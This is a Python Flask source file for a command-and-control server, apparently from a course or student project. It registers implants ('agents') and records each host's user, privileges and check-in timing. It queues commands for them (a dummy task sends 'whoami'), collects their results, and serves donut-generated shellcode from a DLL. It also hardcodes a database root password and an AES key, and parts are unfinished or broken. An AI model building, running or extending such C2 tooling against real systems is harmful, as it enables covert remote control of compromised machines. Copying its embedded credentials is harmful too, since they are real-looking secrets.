from flask import Flask , request, jsonify, redirect, render_template, url_for
from flask_sqlalchemy import SQLAlchemy ## inherently handles syncronization for us ##
from sqlalchemy import Column, Integer, String, ForeignKey, Table, false
import hashlib
from aesgcm import encrypt, decrypt
import json
import donut


### some useful notes here ###
"""
sqlite:///:memory: (in-memory database)
sqlite:///relative_path/test.db (relatie path file-based database)
sqlite:////absolute_path/test.db (abs path file-based database)
"""
# -----------------------------




### configs ###
password = "ch0nky" # a temperary password to test the server
localhost = "http://127.0.0.1:5000"
template_dir = "../client/templates"
aes_key = b"\x41\x13\xcd\xa3\xa0\xe0\xab\x5e\x19\xf1\xc0\x1c\x6d\x4e\x77\xc5\xe5\x20\xd2\x44\x0e\x52\xae\x87\xaa\x0a\x96\x67\x28\x82\xea\x08"
iv_len = 12
tag_len = 16
# -----------------------------





### set up flask app ###

app = Flask(__name__, template_folder=template_dir) # use this to generate routes and handlers
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True    # makes json output more readab;e

# set the database to work with flask ###

# app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_db.sqlite' # set the database to work with flask
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:WQap958910!@localhost/c2_server' #mysql://username:password@server/db
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False # Set to True if you want Flask-SQLAlchemy to track modifications of objects and emit signals
db = SQLAlchemy(app)

# -----------------------------

# 3 statuses for a task
CREATED = "CREATED"
TASKED = 'TASKED'
DONE = "DONE"

class Task(db.Model): # a SQLAlchemy class
    id = db.Column(db.Integer, primary_key=True) ## a database entity that allows us to index the entries
    # need to specify length of String if using MySQL; Feel free to change the length
    job_id = db.Column(db.String(288))
    command_type = db.Column(db.String(288))
    cmd = db.Column(db.String(4096))
    status = db.Column(db.String(288))
    agent_id = db.Column(db.String(288)) ## the agent that is associated with the task


class Client(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(288))
    password = db.Column(db.String(288))
    # implants = db.relationship("Agent", backref='agent', lazy=True)

class Agent(db.Model): 
    id               = db.Column(db.Integer, primary_key = True)
    agent_id         = db.Column(db.String(288))
    password         = db.Column(db.String(288)) # secret key that verifies the agent with server
    computer_name    = db.Column(db.String(288)) # what computer did it connect from
    username         = db.Column(db.String(80)) # what user are you running as
    GUID             = db.Column(db.String(288)) # computer's GUID
    Integrity        = db.Column(db.String(288)) # what privileges do you have
    ip_address       = db.Column(db.String(32))  # what address did the implant connect from
    session_key      = db.Column(db.String(288)) # after you negotiated a session key, store it per agent
    sleep            = db.Column(db.Float)       # how often does the agent check in 
    jitter           = db.Column(db.Float)       # how random of a check in is it
    first_seen       = db.Column(db.DateTime)    # when did the agent first check in
    last_seen        = db.Column(db.DateTime)    # when was the last time you saw the agent
    expected_checkin = db.Column(db.DateTime)    # when should you expect to see the agent again
    #TODO            : a func to generate a new python datatime for expected checkin

# class Agent(db.Model): # a SQLAlchemy class
#     id = db.Column(db.Integer, primary_key=True)
#     agent_id = db.Column(db.String(288))
#     whoami = db.Column(db.String(288))
#     password = db.Column(db.String(288))

# search agent by agent_id
# link for ref: https://flask-sqlalchemy.palletsprojects.com/en/2.x/queries/

def serialize(iv, tag, ct):
    """
        function to serialize response data
    """

    res = iv + tag + ct

    return res

def deserialize(byte_str):
    """
        function to deserialize request data
    """
    res = {}
    res["iv"] = byte_str[:iv_len]
    res["tag"] = byte_str[iv_len:tag_len + iv_len]
    res["cipher"] = byte_str[iv_len + tag_len:]
    return res

def decrypt_data(byte_str):
    data = deserialize(byte_str)
    
    plaintext = decrypt(aes_key, data["iv"], data["cipher"], data["tag"])

    # plaintext = json.loads(plaintext.decode())
    # print(plaintext)

    return plaintext


def find_agent_by_id(id_):
    """
        a function that finds an agent in database by its id
    """
    return Agent.query.filter_by(agent_id=id_).first()

def agent_exist(id_):
    """
        a function that checks if an agent exists
    """
    return find_agent_by_id(id_) != None

def find_client_by_id(id_):
    """
        a function that finds a client in database by its id
    """
    return Client.query.filter_by(client_id=id_).first()

def find_agent_task(agent_id):
    """
        a function that finds a task for an agent
    """
    return Task.query.filter_by(agent_id=agent_id).first()

def hash_passoword(password):
    """
        given a password as a string, return the hashed version
    """
    h = hashlib.sha256()
    h.update(password.encode(encoding='utf-8'))
    hex_password = h.hexdigest()
    return hex_password


def verify_agent_password(reg_agent_id, reg_password):
    """
        a function that verifies the password by comparing
        the hash stored in the database with the hash generated
    """
    hex_password = hash_passoword(reg_password)
    agent = find_agent_by_id(reg_agent_id)
    return agent.password == hex_password

def verify_client_password(reg_client_id, reg_password):
    """
        a function that verifies the password by comparing
        the hash stored in the database with the hash generated
    """
    hex_password = hash_passoword(reg_password)
    client = find_client_by_id(reg_client_id)
    return client.password == hex_password

def list_agents():
    """
        a function that returns a list of agents stored in database
    """
    agents = Agent.query.all()
    agent_ids = [i.agent_id for i in agents]
    return agent_ids

def list_clients():
    """
        a function that returns a list of clients stored in database
    """
    clients = Client.query.all()
    client_ids = [i.client_id for i in clients]
    return client_ids


@app.route('/agent/register', methods=["POST"]) # support only POST requests
def register_agent(): # --> this is a handler
    """
        listens to the /register_agent route
        and processes the registration request from agents
    """
    # request.json -> this will be how we are getting data from implant
    reg_data = request.json # storing registration data
    reg_password = reg_data["password"]
    reg_whoami = reg_data["whoami"]
    reg_agent_id = reg_data["agent_id"]

    agent = Agent(agent_id=reg_agent_id, username=reg_whoami, password=hash_passoword(reg_password))
    db.session.add(agent)
    db.session.commit() ## saves the data to the database

     #TODO: need to change this part so that password is properly verified
    if verify_agent_password(reg_agent_id, reg_password):
        print(f"[+] a new agent has successfully registered: {agent.agent_id}, {agent.username}")
    else:
        # print("[-] authentication failed")
        return jsonify({"status": "authentication failed"})

    return jsonify({"status": "ok", "message": "Welcome!"})

@app.route('/agent/send_task', methods=['POST'])
def send_task():
    """
        listens to the /task route
        When an implant asks for a new task, this function will query the database
        and see if the client has issued any task to that specific agent
        If so, return the task (a list of commands) in a json format
        If not, return an empty json (or something else)
    """
    data = request.json ## getting a request from task route
    if data == None:
        return jsonify({"status": "error: no data"})

    agent_id = data["agent_id"] ## need to verify agent_id 
    password = data["password"] ## and password 
    if not agent_exist(agent_id):
        return jsonify({"status": "error: agent not found"})

    if verify_agent_password(agent_id, password):
        print(f"[+] agent {agent_id} has nothing to do. Give it a job!")
        task = find_agent_task(agent_id) ## find the task for the agent if there is any

        ### A DUMMY CMD FOR TESTING PURPOSES ###
        task = {"command_type": "test_command", "cmd": ["whoami", "ping 8.8.8.8"], "status": "ok"} 
        ### COMMENT OUT WHEN TASK MUST BE READ FROM DB ###

        if task == None:
            return jsonify({"status": "no task for this agent at the moment"})

        return jsonify(task)
    else:
        print("[-] the agent has failed to authenticate")
        return jsonify({"status": "authentication failed"})
    
@app.route('/agent/get_results', methods=['POST'])
def get_results():
    """
        listens to the /task_results route
        When an implant sends back the results of a task, this function will store the results
        in the database
    """
    data = request.json
    if data == None:
        return jsonify({"status": "error: no data"})
    agent_id = data["agent_id"]
    password = data["password"]
    results = data["results"]

    if verify_agent_password(agent_id, password):
        print(f"[+] agent {agent_id} has successfully completed the task")
        print(f"[+] here are the results: {results}")
        agent = find_agent_by_id(agent_id)
        return jsonify({"status": "ok"})
    else:
        print("[-] the agent has failed to authenticate")
        return jsonify({"status": "authentication failed"})

@app.route('/agent/get_shellcode', methods=['GET'])
def get_shellcode():
    shellcode = donut.create(
        file = "test.dll",
        method = "IAmAGoodNoodle",
    )
    return shellcode

@app.route("/")
def login():
    return render_template("login.html")

@app.route('/client/login', methods=['POST'])
def login_client():
    """
        listens to the /register_client route
        and processes the registration request from clients
    """

    try:
        client_id = request.form.get('client_id')
        client_password = request.form.get('password')
        client = Client(client_id=client_id, password=hash_passoword(client_password))
        db.session.add(client)
        db.session.commit()

        #TODO: need to change this part so that password is properly verified
        if verify_client_password(client_id, client_password):
            print(f"[+] a new client has successfully registered: {client.client_id}")
            return redirect(url_for("dashboard")) # redirect to the home page
        else:
            print("[-] authentication failed")
            return jsonify({"status": "authentication failed"})
    except:
        print("[-] fail to get info from webpage")
        return render_template("unauthorized.html")
    
    ## check userID and password
    ## if correct, grant access to home page
    
    return ""

@app.route('/client/dashboard', methods=['GET'])
def dashboard():
    #TODO: display all the info needed
    """
        Listens to the /dashboard route
        This page should show all the agents & operators connected to the server
        
    """
    agent_list = list_agents() # a list of agents that are stored in the database
    client_list = list_clients() # a list of clients that are stored in the database
    info = jsonify({"agents": agent_list, 
                    "clients": client_list})
    
    return info

@app.route("/tasks/create", methods=["POST"])
def create_task():
    data = request.json
    if data == None:
        return jsonify({"status": "error: no data"})
    
    job_id       = os.urandom(16).hex() ##TODO: generate a random job id (might need to change this later)
    command_type = data["command_type"]
    cmd          = data["cmd"]
    agent_id     = data["agent_id"]

    ## error checking ##
    ##TODO: check if command type and cmd are valid

    if(not agent_exist(agent_id)):
        return jsonify({"status": "error: agent does not exist"})
    
    task = Task(
        command_type=command_type,
        cmd=cmd,
        agent_id=agent_id,
    )
    db.session.add(task)
    db.session.commit()
    print(f"[+] a new task has been created for agent {agent_id}")
    return jsonify({"status": "ok", "job_id": job_id})

@app.route("/test", methods=["GET", "POST"])
def test():
    if request.method == "GET":
        payload = b"\x87\xb8\xa9\xa6\xc2\x39\x42\x5f\xc2\xda\x8c\xc1\xb5\x6a\x9b\x69\x26\x0e\x79\x75\xe5\x81\x29\xe0\x6d\x68\xb3\x62\x1f\xc4\x4d\xa3\x55\xda\x0f\x32\xb6\xd2\x89\x7b\x22"
        return payload
    else:
        message = decrypt_data(request.data) 
        print(message)
        return request.data


if __name__ == '__main__':
    # HTTPS uses TLS (SSL) to encrypt normal HTTP requests and responses
    # app.run(ssl_context='adhoc') # run with TLS encryption 
    app.run()                      # run without TLS encryption










## Wayne's Notes ##
"""
    1. displaying message sent from backend to frontend

    In HTML:
    {% if message %}
        <h1>{{message}}!</h1>
    {% endif %}

    In Backend:
    return render_template('hello.html', message="Welcome!")

    2. receiving message from frontend to backend

    In HTML:
    <div id="song_content">
        <form method="post" action="{{ url_for('displaysearch') }}">
            <label for="song_title"></label>
            <input type="song_title" name="song_title" placeholder="Enter a song title here.." />
            <input type="submit" value="Search">
        </form>
    </div>

    In backend:
    @app.route("/displaysearch", methods=['POST'])
    def displaysearch():
        try:
            song = request.form.get('song_title') ## get input from webpage
        except:
            print("couldn't find all tokens")
            return render_template('song.html', message='error')

"""